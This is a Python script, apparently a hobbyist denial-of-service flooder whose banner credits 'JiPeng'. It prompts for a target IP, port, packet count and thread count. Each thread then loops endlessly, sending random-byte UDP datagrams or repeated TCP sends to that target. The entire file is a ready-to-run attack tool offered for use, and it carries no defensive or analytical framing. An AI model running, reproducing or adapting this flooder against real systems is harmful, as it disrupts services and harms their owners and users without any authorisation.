#!/usr/bin/env python3
import random
import socket
import threading

B = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'

print(H+"~~~ Distributed Denial-of-Service ~~~")
print(R+"~~~           by JiPeng           ~~~")
ip = str(input(C+" Target Internet Protocol:"))
port = int(input(" Target Port:"))
choice = str(input(" Attack with User Datagram Protocol:"))
times = int(input(" Packages:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(2023)
	i = random.choice(("[Paket dari JiPeng]","[Paket dari JiPeng]","[Paket dari JiPeng]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(R+ i +" Sending Packages")
		except:
			print("[!] Package Trouble")

def run2():
	data = random._urandom(20)
	i = random.choice(("[Paket dari JiPeng]","[Paket dari JiPeng]","[Paket dari JiPeng]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sending Packages")
		except:
			print("[!] Package Trouble")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()